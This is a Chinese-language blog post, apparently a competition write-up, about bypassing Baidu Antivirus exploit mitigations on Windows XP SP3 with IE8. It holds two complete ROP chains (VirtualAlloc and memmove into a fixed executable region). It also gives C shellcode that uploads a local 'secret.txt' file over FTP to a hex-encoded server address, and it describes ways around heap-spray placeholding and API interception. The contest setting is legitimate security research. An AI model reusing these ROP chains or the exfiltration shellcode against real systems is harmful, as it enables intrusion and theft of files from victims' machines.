---
layout:     post
title:      绕过百度杀毒溢出保护的一些方法
category: blog
description: 参加XP挑战赛时写的老文章
---

## 背景 ##
&emsp;&emsp;前段时间参加了http://xp.erangelab.com/举办的XP挑战赛，把绕过一些安全防护软件的过程和大家分享一下。其中百度杀毒的测试版本为1.8.14.1

## 使用的IE漏洞 ##

&emsp;&emsp;由于比赛系统为XP SP3 +IE8未打任何其他补丁，所以从IE漏洞选取了CVE 2012-1889、CVE 2012-4969、CVE 2013-1347，原因就是这三个能在网上找到现成的exp，后来证明多找几个漏洞还是很必要的，因为适应各种突发变化。

## 百度防护手段 ##

- 防堆喷射

&emsp;&emsp;这几个漏洞本身没什么可说的，拿到1889就开始在百度卫士上开测，直接IE加载exp，没有成功IE崩溃，这是必然的嘛，要不然还叫什么保护。因为yuange、tk等高人说的DVE技术我还没有学会，所以还是用被大牛们淘汰的堆喷射，用vmmap打开IE进程，发现堆喷的地址都被占位了：
![spary1](../images/baiduav/spray1-300x66.png)

&emsp;&emsp;这就是传说中的占坑，0C0C0C0C这种地址都被占了，这样我们堆喷的时候当然就占不到这个位置了。但是，事实证明这种方法对于防护堆喷射一点作用都没有，我不知道做这个功能的人自己试验了没有，在提前占坑的进程中堆喷射，喷射完成后内存布局是这样的：
![spray2](../images/baiduav/spray2.png)

&emsp;&emsp;可以看到除了开始的4K以外，后面该喷射占用的内存还是一样占用了，0C0D0000里面照样是我们的的shellcode，我们利用的时候直接用0C0E0C0C这个地址就好了，保证是成功喷射的，所以占坑这招只要改个地址就可以破解了。百度和金山都用了这种占坑的方法，而事实证明这种做法根本没有任何意义，而金山的实现更差，用explib直接喷射仍然占了0C0C0C0C。现在精确堆喷射的技术已经很成熟了，这方面不再多做介绍。

- 防ROP

&emsp;&emsp;因为XP SP3上是没有ASLR的，因此我们只要ROP绕过DEP就可以了，喷射成功之后，就成功来到了shellcode中，但还是被百度报了ROP攻击，当然大牛们可以用DVE技术，但是咱还没学会不是，还是老老实实看看ROP怎么绕过保护。网上找的原始exp里的ROP是用VirtualProtect，跟踪发现调用这个API的时候被百度拦截了，于是要找其他的ROP，打开immunity debugger，用mona插件（[https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/ "mona")）找了几种不同的ROP，经过修改调试之后，在百度环境下测试发现VirtualAlloc没有被百度拦截，终于成功进入了真正的shellcode，不过最后一天百度升级补了此方法，最后没有用这种方法，后面绕过的方法随后再介绍。下面是VirtualAlloc的ROP：

    var rop_chain = unescape(  
    "‰uBE4C‰u77BE" + // 0x77BEBE4C # retn [msvcrt.dll]  
    "‰uBE4B‰u77BE" + // 0x77BEBE4B # pop ebp # retn [msvcrt.dll]  
    "‰u5ED5‰u77BE" + // 0x77BE5ED5 # xchg eax, esp # retn [msvcrt.dll]  
    "‰uBE4C‰u77BE" + // 0x77BEBE4C # retn [msvcrt.dll]  
    "‰uBE4C‰u77BE" + // 0x77BEBE4C # retn [msvcrt.dll]  
    "‰uBE4C‰u77BE" + // 0x77BEBE4C # retn [msvcrt.dll]  
    "‰uBE4C‰u77BE" + // 0x77BEBE4C # retn [msvcrt.dll]  
    "‰u89dd‰u77bf" + // 0x77bf89dd : ,# POP EBP # RETN [msvcrt.dll]  
    "‰u89dd‰u77bf" + // 0x77bf89dd : ,# skip 4 bytes [msvcrt.dll]  
    "‰u6e91‰u77c1" + // 0x77c16e91 : ,# POP EBX # RETN [msvcrt.dll]  
    "‰u0001‰u0000" + // 0x00000001 : ,# 0x00000001−> ebx  
    "‰ue185‰u77c1" + // 0x77c1e185 : ,# POP EDX # RETN [msvcrt.dll]  
    "‰u1000‰u0000" + // 0x00001000 : ,# 0x00001000−> edx  
    "‰u0f48‰u77c1" + // 0x77c10f48 : ,# POP ECX # RETN [msvcrt.dll]  
    "‰u0040‰u0000" + // 0x00000040 : ,# 0x00000040−> ecx  
    "‰u79d8‰u77c1" + // 0x77c179d8 : ,# POP EDI # RETN [msvcrt.dll]  
    "‰u6101‰u77c1" + // 0x77c16101 : ,# RETN (ROP NOP) [msvcrt.dll]  
    "‰u2666‰u77bf" + // 0x77bf2666 : ,# POP ESI # RETN [msvcrt.dll]  
    "‰uaacc‰u77bf" + // 0x77bfaacc : ,# JMP [EAX] [msvcrt.dll]  
    "‰u2217‰u77c2" + // 0x77c22217 : ,# POP EAX # RETN [msvcrt.dll]  
    "‰u111d‰u77be" + // 0x77be110c+11 77BE111d : ,# ptr to &VirtualAlloc()  
    "‰u67f0‰u77c2" + // 0x77c267f0 : ,# PUSHAD # ADD AL,0EF # RETN [msvcrt.dll]  
    "‰u1025‰u77c2" // 0x77c21025 : ,# ptr to 'push esp # ret ' [msvcrt.dll]  
    );  

- 绕过沙盒

&emsp;&emsp;因为比赛的规则是需要在本地读取一个文件，然后通过FTP上传到指定服务器。但我测试发现即使成功执行了shellcode，仍然无法运行外部程序上传文件。在调用很多系统API的时候会被百度报，包括使用socket连接外部IP都不行，想执行系统的ftp.exe就更不可能了，这样就陷入无法上传文件的窘境。

&emsp;&emsp;后来想到WinInet是提供FTP功能的，试验一下果然可以，百度和金山都没有对WinInet API进行拦截，因此成功上传了文件。下面是Shellcode源码，用的是tk大神的C编写shellcode模板（[https://github.com/tombkeeper/Shellcode_Template_in_C](https://github.com/tombkeeper/Shellcode_Template_in_C "c shellcode")）：

    void ShellCode(void)  
    {  
    struct  KERNEL32Kernel32;  
    struct  WININET WinInet;  
      
    HMODULE hWinInet;  
    HINTERNET hInternet;  
    HINTERNET hConnect;  
      
    DWORD   sz_Wininet[] = { 0x696e6977, 0x2e74656e, 0x006c6c64, 0x00000000 };  
    DWORD   sz_InternetOpenA[] = { 0x65746e49, 0x74656e72, 0x6e65704f, 0x00000041 };  
    DWORD   sz_InternetConnectA[] = { 0x65746e49, 0x74656e72, 0x6e6e6f43, 0x41746365, 0x00000000 };  
    DWORD   sz_FtpPutFileA[] = { 0x50707446, 0x69467475, 0x0041656c, 0x00000000 };  
    DWORD   sz_InternetCloseHandle[] = { 0x65746e49, 0x74656e72, 0x736f6c43, 0x6e614865, 0x00656c64 };  
    DWORD   sz_Server[] = { 0x2e323931, 0x2e383631, 0x2e393531, 0x00000036 };  
    DWORD   sz_User[] = { 0x00707466 };  
    DWORD   sz_Pass[] = { 0x00707466 };  
    DWORD   sz_LocalFile[] = { 0x745c3a63, 0x5c747365, 0x72636573, 0x742e7465, 0x00007478 };  //c:\test\secret.txt  
    DWORD   sz_RemoteFile[] = { 0x78742e61, 0x00000074 };  
      
    Kernel32.BaseAddr = GetKernel32Base();  
    //Kernel32.LoadLibraryA = GetProcAddrByHash(Kernel32.BaseAddr, HASH_LoadLibraryA);  
    Kernel32.GetModuleHandleA = GetProcAddrByHash(Kernel32.BaseAddr, HASH_GetModuleHandleA);  
    Kernel32.GetProcAddress = GetProcAddrByHash(Kernel32.BaseAddr, HASH_GetProcAddress);  
    Kernel32.Sleep = GetProcAddrByHash(Kernel32.BaseAddr, HASH_Sleep);  
      
    hWinInet = Kernel32.GetModuleHandleA(sz_Wininet);  
    WinInet.InternetOpenA = Kernel32.GetProcAddress(hWinInet, sz_InternetOpenA);  
    WinInet.InternetConnectA = Kernel32.GetProcAddress(hWinInet, sz_InternetConnectA);  
    WinInet.FtpPutFileA = Kernel32.GetProcAddress(hWinInet, sz_FtpPutFileA);  
    WinInet.InternetCloseHandle = Kernel32.GetProcAddress(hWinInet, sz_InternetCloseHandle);  
      
    hInternet = WinInet.InternetOpen(sz_User, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE);  
    Kernel32.Sleep(1000);  
    hConnect  = WinInet.InternetConnect(hInternet, sz_Server, INTERNET_DEFAULT_FTP_PORT, sz_User, sz_Pass, INTERNET_SERVICE_FTP, INTERNET_FLAG_EXISTING_CONNECT || INTERNET_FLAG_PASSIVE,0);  
    Kernel32.Sleep(1000);  
      
    WinInet.FtpPutFile(hConnect,sz_LocalFile,sz_RemoteFile,FTP_TRANSFER_TYPE_ASCII,0);  
    Kernel32.Sleep(1000);  
    WinInet.InternetCloseHandle(hConnect);  
    WinInet.InternetCloseHandle(hInternet);  
    Kernel32.Sleep(0x7fffffff);  
    }  

- 再次绕过ROP防护

&emsp;&emsp;因为比赛规则是使用开赛厂商前一天中午12点的官网发布的版本，所以即使提前过了这些杀毒软件也没什么好高兴的，果不其然，开赛前一天所有杀毒软件都推出了更新版本，测试后好似被泼了一头冷水，原来的绕过方法又被拦截了。

&emsp;&emsp;最主要的问题在于ROP，百度在最后更新版本里加入了对VirtualAlloc的拦截，前面那个ROP显然是白弄了。测试发现更新后对HeapCreate也拦截了，而在IE里面SetProcessDEPPolicy和NtSetInformationProcess因为被调用过都不能用了，所以常见的ROP手段都被防住了。

&emsp;&emsp;正当我准备放弃ROP另觅出路的时候看了一眼内存，惊奇的发现了
![memory](../images/baiduav/mem.jpg)

&emsp;&emsp;140000这块内存是读写执行属性的，大小0x1000放shellcode绰绰有余，而且重启之后地址不变！这是什么节奏？百度给留的后门啊。

&emsp;&emsp;现在只需要写一个memcpy的ROP，把shellcode拷贝到140000，然后跳过去执行就OK了。长话短说，写这个ROP也费老劲了，因为以前都是依赖mona，从来没有字节动手写过ROP，开始写才发现忒累，构造一堆寄存器要保证PUSHAD之后恰好是memcpy的参数，还要保证恰好返回到1400XX，花了足有两个小时才调通。下面是修改后的新ROP链：

    var rop_chain = unescape(  
    "‰uBE4C‰u77BE" + // 0x77BEBE4C # retn [msvcrt.dll]  
    "‰uBE4B‰u77BE" + // 0x77BEBE4B # pop ebp # retn [msvcrt.dll]  
    "‰u5ED5‰u77BE" + // 0x77BE5ED5 # xchg eax, esp # retn [msvcrt.dll]  
    "‰uBE4C‰u77BE" + // 0x77BEBE4C # retn [msvcrt.dll]  
    "‰uBE4C‰u77BE" + // 0x77BEBE4C # retn [msvcrt.dll]  
    "‰uBE4C‰u77BE" + // 0x77BEBE4C # retn [msvcrt.dll]  
    "‰uBE4C‰u77BE" + // 0x77BEBE4C # retn [msvcrt.dll]  
    "‰u89dd‰u77bf" + // 0x77bf89dd : ,# POP EBP # RETN [msvcrt.dll]  
    "‰u0000‰u0014" + // MEMMOVE DEST  
    "‰u6e91‰u77c1" + // 0x77c16e91 : ,# POP EBX # RETN [msvcrt.dll]  
    "‰u1000‰u0000" + // 0x00000001 : ,# 0x00000001−> ebx  
    "‰ue185‰u77c1" + // 0x77c1e185 : ,# POP EDX # RETN [msvcrt.dll]  
    "‰u89dd‰u77bf" + // 0x77bf89dd : ,# POP EBP # RETN [msvcrt.dll]  
    "‰u0f48‰u77c1" + // 0x77c10f48 : ,# POP ECX # RETN [msvcrt.dll]  
    "‰u1000‰u0000" + // 0x00001000 : ,# 0x00001000−> ecx  
    "‰u79d8‰u77c1" + // 0x77c179d8 : ,# POP EDI # RETN [msvcrt.dll]  
    "‰u2787‰u77bf" + // JMP EAX  
    "‰u2666‰u77bf" + // 0x77bf2666 : ,# POP ESI # RETN [msvcrt.dll]  
    "‰u0006‰u0014" + // RETURN TO 140006 REAL SHELLCODE  
    "‰u2217‰u77c2" + // # POP EAX # RETN [msvcrt.dll]  
    "‰u72c1‰u77c1" + // # ptr to memmove() [IAT msvcrt.dll]  
    "‰u67f0‰u77c2" + // 0# PUSHAD # ADD AL,0EF # RETN [msvcrt.dll]  
    "‰u0006‰u0014" //NO USE  
    );  
&emsp;&emsp;在百度更新后测试可以绕过保护。

&emsp;&emsp;另外提一下百度非常不厚道的一点，这次比赛的目的就是测试在系统存在漏洞的情况下，杀毒软件是否能保护系统不受攻击，所以除了SP3之外没有打任何额外的补丁。但是百度在比赛前一天的更新却自动给系统打了补丁，把mshtml.dll替换成了新版本。本来测试的三个漏洞里CVE 2013-1347是最好用的，因为不需要堆喷射，速度嗖嗖的快，本来我也是要以这个为主力的，没想到百度最后一刻补了mshtml，导致这个漏洞没法利用了，所以最后只好用2012-1889来攻击了，因为2012-1889是msxml里的漏洞，百度忘了补这个：）